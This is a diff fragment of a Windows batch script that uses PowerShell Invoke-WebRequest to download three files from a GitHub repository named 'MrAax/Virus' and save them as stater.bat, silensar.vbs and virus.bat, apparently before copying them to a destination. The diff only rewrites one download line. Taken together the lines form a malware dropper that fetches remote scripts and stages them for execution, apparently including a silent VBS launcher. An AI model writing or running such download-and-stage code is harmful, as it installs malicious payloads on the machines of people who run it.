@@ -2,7 +2,7 @@
 cls
 :: First download a file.
 Powershell -Command "Invoke-WebRequest 'https://github.com/MrAax/Virus/blob/main/Windows/stater.txt' -OutFile stater.bat"
-Powershell -Command "& { iwr https://github.com/MrAax/Virus/blob/main/Windows/silensar.txt -OutFile silensar.vbs}"
+Powershell -Command "Invoke-WebRequest 'https://github.com/MrAax/Virus/blob/main/Windows/silensar.txt' -OutFile silensar.vbs"
 Powershell -Command "Invoke-WebRequest 'https://github.com/MrAax/Virus/blob/main/Windows/virus.txt' -OutFile virus.bat"
 
 :: Copy all files in destination.
